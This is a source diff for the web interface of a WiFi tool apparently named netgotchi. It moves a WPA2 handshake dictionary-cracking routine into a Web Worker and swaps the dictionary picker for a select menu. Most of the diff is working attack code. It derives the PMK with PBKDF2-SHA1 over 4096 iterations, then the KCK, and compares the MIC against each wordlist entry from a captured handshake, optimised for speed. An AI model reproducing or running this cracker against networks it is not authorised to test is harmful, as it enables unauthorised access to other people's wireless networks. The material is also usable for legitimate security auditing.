@@ -747,85 +747,106 @@ function parsePcap(data, filePath) {
   return hs;
 }
 
-// ── Crack: WPA2 crypto (pure JS — works over plain HTTP) ─────
-const _PRF_LABEL = new TextEncoder().encode("Pairwise key expansion\0");
+// ── Crack: Web Worker (optimised SHA1, no per-password yield) ─
+let _crackWorker = null;
 
-function _sha1(data) {
-  const k = (55 - data.length % 64 + 64) % 64;
-  const msg = new Uint8Array(data.length + 1 + k + 8);
-  msg.set(data);
-  msg[data.length] = 0x80;
-  const dv = new DataView(msg.buffer);
-  const ml = data.length * 8;
-  dv.setUint32(msg.length - 4, ml >>> 0, false);
-  dv.setUint32(msg.length - 8, Math.floor(ml / 4294967296), false);
-  let h0=0x67452301, h1=0xEFCDAB89, h2=0x98BADCFE, h3=0x10325476, h4=0xC3D2E1F0;
-  const w = new Int32Array(80);
-  for (let off = 0; off < msg.length; off += 64) {
-    for (let i=0;i<16;i++) w[i]=dv.getInt32(off+i*4,false);
-    for (let i=16;i<80;i++){const x=w[i-3]^w[i-8]^w[i-14]^w[i-16];w[i]=(x<<1)|(x>>>31);}
+const _CRACK_WORKER_SRC = `
+// Pre-allocated scratch — zero GC pressure in the hot loop
+const _W=new Int32Array(80),_SMSG=new Uint8Array(512),_SOUT=new Uint8Array(20);
+const _HINN=new Uint8Array(512),_HOUT=new Uint8Array(84),_HIH=new Uint8Array(20);
+const _U=new Uint8Array(20),_T1=new Uint8Array(20),_T2=new Uint8Array(20);
+const _PMK=new Uint8Array(32),_SB=new Uint8Array(40),_K64=new Uint8Array(64);
+const _PRE1={ip:new Uint8Array(64),op:new Uint8Array(64)};
+const _PRE2={ip:new Uint8Array(64),op:new Uint8Array(64)};
+const _PRE3={ip:new Uint8Array(64),op:new Uint8Array(64)};
+const _PWBUF=new Uint8Array(64);
+const _enc=new TextEncoder();
+const _PRF_LABEL=new Uint8Array([80,97,105,114,119,105,115,101,32,107,101,121,32,101,120,112,97,110,115,105,111,110,0]);
+let _pin=null,_stop=false;
+
+function _sha1(src,sLen,out){
+  if(src!==_SMSG)_SMSG.set(src.subarray(0,sLen));
+  const k=(55-sLen%64+64)%64,mLen=sLen+1+k+8;
+  _SMSG[sLen]=0x80;_SMSG.fill(0,sLen+1,mLen);
+  const ml=sLen*8;
+  _SMSG[mLen-8]=_SMSG[mLen-7]=_SMSG[mLen-6]=_SMSG[mLen-5]=0;
+  _SMSG[mLen-4]=(ml>>>24)&0xFF;_SMSG[mLen-3]=(ml>>>16)&0xFF;
+  _SMSG[mLen-2]=(ml>>>8)&0xFF;_SMSG[mLen-1]=ml&0xFF;
+  let h0=0x67452301,h1=0xEFCDAB89,h2=0x98BADCFE,h3=0x10325476,h4=0xC3D2E1F0;
+  for(let off=0;off<mLen;off+=64){
+    for(let i=0;i<16;i++)_W[i]=(_SMSG[off+i*4]<<24)|(_SMSG[off+i*4+1]<<16)|(_SMSG[off+i*4+2]<<8)|_SMSG[off+i*4+3];
+    for(let i=16;i<80;i++){const x=_W[i-3]^_W[i-8]^_W[i-14]^_W[i-16];_W[i]=(x<<1)|(x>>>31);}
     let a=h0,b=h1,c=h2,d=h3,e=h4;
-    for (let i=0;i<80;i++){
+    for(let i=0;i<80;i++){
       let f,K;
-      if      (i<20){f=(b&c)|(~b&d);       K=0x5A827999;}
-      else if (i<40){f=b^c^d;              K=0x6ED9EBA1;}
-      else if (i<60){f=(b&c)|(b&d)|(c&d); K=0x8F1BBCDC;}
-      else          {f=b^c^d;              K=0xCA62C1D6;}
-      const t=(((a<<5)|(a>>>27))+f+e+K+w[i])|0;
+      if(i<20){f=(b&c)|(~b&d);K=0x5A827999;}
+      else if(i<40){f=b^c^d;K=0x6ED9EBA1;}
+      else if(i<60){f=(b&c)|(b&d)|(c&d);K=0x8F1BBCDC;}
+      else{f=b^c^d;K=0xCA62C1D6;}
+      const t=(((a<<5)|(a>>>27))+f+e+K+_W[i])|0;
       e=d;d=c;c=(b<<30)|(b>>>2);b=a;a=t;
     }
     h0=(h0+a)|0;h1=(h1+b)|0;h2=(h2+c)|0;h3=(h3+d)|0;h4=(h4+e)|0;
   }
-  const out=new Uint8Array(20),ov=new DataView(out.buffer);
-  ov.setUint32(0,h0>>>0,false);ov.setUint32(4,h1>>>0,false);
-  ov.setUint32(8,h2>>>0,false);ov.setUint32(12,h3>>>0,false);
-  ov.setUint32(16,h4>>>0,false);
-  return out;
+  out[0]=(h0>>>24)&0xFF;out[1]=(h0>>>16)&0xFF;out[2]=(h0>>>8)&0xFF;out[3]=h0&0xFF;
+  out[4]=(h1>>>24)&0xFF;out[5]=(h1>>>16)&0xFF;out[6]=(h1>>>8)&0xFF;out[7]=h1&0xFF;
+  out[8]=(h2>>>24)&0xFF;out[9]=(h2>>>16)&0xFF;out[10]=(h2>>>8)&0xFF;out[11]=h2&0xFF;
+  out[12]=(h3>>>24)&0xFF;out[13]=(h3>>>16)&0xFF;out[14]=(h3>>>8)&0xFF;out[15]=h3&0xFF;
+  out[16]=(h4>>>24)&0xFF;out[17]=(h4>>>16)&0xFF;out[18]=(h4>>>8)&0xFF;out[19]=h4&0xFF;
 }
-
-function _hmacPre(key) {
-  if (key.length > 64) key = _sha1(key);
-  const k = new Uint8Array(64);
-  k.set(key.subarray ? key.subarray(0, Math.min(key.length, 64)) : key);
-  const ip=new Uint8Array(64),op=new Uint8Array(64);
-  for(let i=0;i<64;i++){ip[i]=k[i]^0x36;op[i]=k[i]^0x5C;}
-  return {ip,op};
+function _hmacPreInto(key,kLen,pre){
+  _K64.fill(0);
+  if(kLen>64){_sha1(key,kLen,_SOUT);_K64.set(_SOUT.subarray(0,20));}
+  else _K64.set(key.subarray(0,kLen));
+  for(let i=0;i<64;i++){pre.ip[i]=_K64[i]^0x36;pre.op[i]=_K64[i]^0x5C;}
 }
-
-function _hmacFin(pre, data) {
-  const inn=new Uint8Array(64+data.length);
-  inn.set(pre.ip);inn.set(data,64);
-  const ih=_sha1(inn);
-  const out=new Uint8Array(84);
-  out.set(pre.op);out.set(ih,64);
-  return _sha1(out);
+function _hmacFin(pre,data,dLen,out){
+  _HINN.set(pre.ip,0);_HINN.set(data.subarray(0,dLen),64);
+  _sha1(_HINN,64+dLen,_HIH);
+  _HOUT.set(pre.op,0);_HOUT.set(_HIH,64);
+  _sha1(_HOUT,84,out);
 }
-
-function _pbkdf2(pre, salt, iters) {
-  const pmk=new Uint8Array(32);
+function _pbkdf2(pre,ssidBytes){
+  const sLen=ssidBytes.length;
   for(let blk=1;blk<=2;blk++){
-    const sb=new Uint8Array(salt.length+4);
-    sb.set(salt);sb[salt.length+3]=blk;
-    let u=_hmacFin(pre,sb);
-    const t=new Uint8Array(u);
-    for(let i=1;i<iters;i++){u=_hmacFin(pre,u);for(let j=0;j<20;j++)t[j]^=u[j];}
-    const oo=(blk-1)*20,ol=Math.min(20,32-oo);
-    pmk.set(t.subarray(0,ol),oo);
+    _SB.set(ssidBytes,0);_SB[sLen]=0;_SB[sLen+1]=0;_SB[sLen+2]=0;_SB[sLen+3]=blk;
+    _hmacFin(pre,_SB,sLen+4,_U);
+    const T=blk===1?_T1:_T2;T.set(_U);
+    for(let i=1;i<4096;i++){_hmacFin(pre,_U,20,_U);for(let j=0;j<20;j++)T[j]^=_U[j];}
+    const oo=(blk-1)*20,ol=Math.min(20,32-oo);_PMK.set(T.subarray(0,ol),oo);
   }
-  return pmk;
 }
-
-function wpa2TryPassword(pw, hs) {
-  const pre = _hmacPre(new TextEncoder().encode(pw));
-  const pmk = _pbkdf2(pre, hs.ssidBytes, 4096);
-  const pin = new Uint8Array(_PRF_LABEL.length + hs.prfData.length + 1);
-  pin.set(_PRF_LABEL); pin.set(hs.prfData, _PRF_LABEL.length);
-  pin[_PRF_LABEL.length + hs.prfData.length] = 0;
-  const kck = _hmacFin(_hmacPre(pmk), pin).subarray(0, 16);
-  const calc = _hmacFin(_hmacPre(kck), hs.eapol);
-  for (let i = 0; i < 16; i++) if (calc[i] !== hs.mic[i]) return false;
+function _tryPw(pw,hs){
+  const r=_enc.encodeInto(pw,_PWBUF);
+  _hmacPreInto(_PWBUF,r.written,_PRE1);
+  _pbkdf2(_PRE1,hs.ssidBytes);
+  _hmacPreInto(_PMK,32,_PRE2);
+  _hmacFin(_PRE2,_pin,_pin.length,_SOUT);
+  _hmacPreInto(_SOUT,16,_PRE3);
+  _hmacFin(_PRE3,hs.eapol,hs.eapol.length,_SOUT);
+  for(let i=0;i<16;i++)if(_SOUT[i]!==hs.mic[i])return false;
   return true;
 }
+onmessage=function(e){
+  const msg=e.data;
+  if(msg.type==="stop"){_stop=true;return;}
+  if(msg.type!=="start")return;
+  _stop=false;
+  const hs=msg.hs,words=msg.words,total=words.length;
+  _pin=new Uint8Array(_PRF_LABEL.length+hs.prfData.length);
+  _pin.set(_PRF_LABEL);_pin.set(hs.prfData,_PRF_LABEL.length);
+  let tested=0,lastUpd=Date.now();
+  for(let i=0;i<total&&!_stop;i++){
+    if(_tryPw(words[i],hs)){
+      postMessage({type:"done",found:true,pw:words[i],tested:i+1});return;
+    }
+    tested++;
+    const now=Date.now();
+    if(now-lastUpd>=150){lastUpd=now;postMessage({type:"progress",tested,total});}
+  }
+  postMessage({type:"done",found:false,stopped:_stop,tested});
+};
+`;
 
 // ── Crack: UI helpers ─────────────────────────────────────────
 function _crackSetPhase(phase) {
@@ -907,26 +928,15 @@ const _BUILTIN_DICT = [
 ];
 
 // ── Crack: dict list ──────────────────────────────────────────
-function _addDictOption(list, value, label, idx) {
-  const lbl   = document.createElement("label");
-  const radio = document.createElement("input");
-  radio.type  = "radio";
-  radio.name  = "crack-dict";
-  radio.value = value;
-  radio.id    = "dict-" + idx;
-  radio.addEventListener("change", () => { $(".act-crack-go").disabled = false; });
-  lbl.appendChild(radio);
-  lbl.appendChild(document.createTextNode(label));
-  list.appendChild(lbl);
-}
-
 async function loadDictList() {
-  const list = $(".crack-dict-list");
-  list.innerHTML = "";
-  $(".act-crack-go").disabled = true;
+  const sel = $(".crack-dict-select");
+  sel.innerHTML = "";
+  $(".act-crack-go").disabled = false;
 
-  // Always offer builtin
-  _addDictOption(list, "__builtin__", "built-in (" + _BUILTIN_DICT.length + " words)", 0);
+  const builtin = document.createElement("option");
+  builtin.value = "__builtin__";
+  builtin.textContent = "built-in (" + _BUILTIN_DICT.length + " words)";
+  sel.appendChild(builtin);
 
   try {
     const res   = await requestPost("/", { command: "ls", path: "/netgotchi/dictionaries" });
@@ -934,8 +944,11 @@ async function loadDictList() {
       .filter(l => l.startsWith("FILE:"))
       .map(l => l.split(":")[1])
       .filter(Boolean);
-    files.forEach((name, i) => {
-      _addDictOption(list, "/netgotchi/dictionaries/" + name, name, i + 1);
+    files.forEach(name => {
+      const opt = document.createElement("option");
+      opt.value = "/netgotchi/dictionaries/" + name;
+      opt.textContent = name;
+      sel.appendChild(opt);
     });
   } catch (_) {
     // dir may not exist; builtin still available
@@ -944,9 +957,9 @@ async function loadDictList() {
 
 // ── Crack: runner ─────────────────────────────────────────────
 async function runCrack(pcapPath) {
-  const radio = document.querySelector('input[name="crack-dict"]:checked');
-  if (!radio) return;
-  const dictPath = radio.value;
+  const sel = $(".crack-dict-select");
+  if (!sel || !sel.value) return;
+  const dictPath = sel.value;
 
   _crackRunning = true;
   _crackStop    = false;
@@ -994,36 +1007,41 @@ async function runCrack(pcapPath) {
   }
 
   const total = words.length;
-  let tested = 0;
   const t0 = Date.now();
-  let lastUpd = t0;
 
-  for (const pw of words) {
-    if (_crackStop) break;
-    await new Promise(r => setTimeout(r, 0)); // yield — keeps browser responsive
-    const hit = wpa2TryPassword(pw, hs);
-    tested++;
+  if (_crackWorker) { _crackWorker.terminate(); _crackWorker = null; }
+  const blob = new Blob([_CRACK_WORKER_SRC], { type: "application/javascript" });
+  _crackWorker = new Worker(URL.createObjectURL(blob));
 
-    const now = Date.now();
-    if (now - lastUpd >= 150) {
-      lastUpd = now;
-      const secs = Math.max((now - t0) / 1000, 0.001);
-      const wps  = Math.round(tested / secs);
-      const eta  = wps > 0 ? Math.round((total - tested) / wps) : 0;
-      updateCrackProgress(tested, total, wps, eta);
-    }
-
-    if (hit) {
-      updateCrackProgress(tested, total, 0, 0);
-      _crackDone("Found: " + pw, pw);
+  _crackWorker.onmessage = function(e) {
+    const msg = e.data;
+    if (msg.type === "progress") {
+      const secs = Math.max((Date.now() - t0) / 1000, 0.001);
+      const wps = Math.round(msg.tested / secs);
+      const eta = wps > 0 ? Math.round((total - msg.tested) / wps) : 0;
+      updateCrackProgress(msg.tested, total, wps, eta);
+    } else if (msg.type === "done") {
+      updateCrackProgress(msg.tested || total, total, 0, 0);
+      _crackDone(msg.found ? "Found: " + msg.pw : (msg.stopped ? "Stopped" : "Not found"),
+                 msg.found ? msg.pw : null);
+      _crackWorker.terminate();
+      _crackWorker = null;
       _crackRunning = false;
-      return;
     }
-  }
+  };
 
-  updateCrackProgress(tested, total, 0, 0);
-  _crackDone(_crackStop ? "Stopped" : "Not found");
-  _crackRunning = false;
+  _crackWorker.onerror = function(err) {
+    _crackDone("Worker error: " + err.message);
+    _crackWorker.terminate();
+    _crackWorker = null;
+    _crackRunning = false;
+  };
+
+  _crackWorker.postMessage({
+    type: "start",
+    hs: { ssidBytes: hs.ssidBytes, prfData: hs.prfData, eapol: hs.eapol, mic: hs.mic },
+    words
+  });
 }
 
 // ── Crack: event wiring ───────────────────────────────────────
@@ -1046,7 +1064,10 @@ $(".act-crack-go").addEventListener("click", () => {
   runCrack(_crackFilePath);
 });
 
-$(".act-crack-stop").addEventListener("click", () => { _crackStop = true; });
+$(".act-crack-stop").addEventListener("click", () => {
+  _crackStop = true;
+  if (_crackWorker) _crackWorker.postMessage({ type: "stop" });
+});
 
 $(".act-crack-retry-save").addEventListener("click", () => {
   if (_crackFoundPw) _saveCrack(_crackFoundPw);
@@ -1055,7 +1076,8 @@ $(".act-crack-retry-save").addEventListener("click", () => {
 // Stop in-progress crack when dialog closes
 const _origHide = Dialog.hide.bind(Dialog);
 Dialog.hide = function () {
-  if (_crackRunning) _crackStop = true;
+  if (_crackWorker) { _crackWorker.terminate(); _crackWorker = null; _crackRunning = false; }
+  _crackStop = true;
   _crackFoundPw = null;
   $(".act-crack-retry-save").classList.add("hidden");
   _origHide();
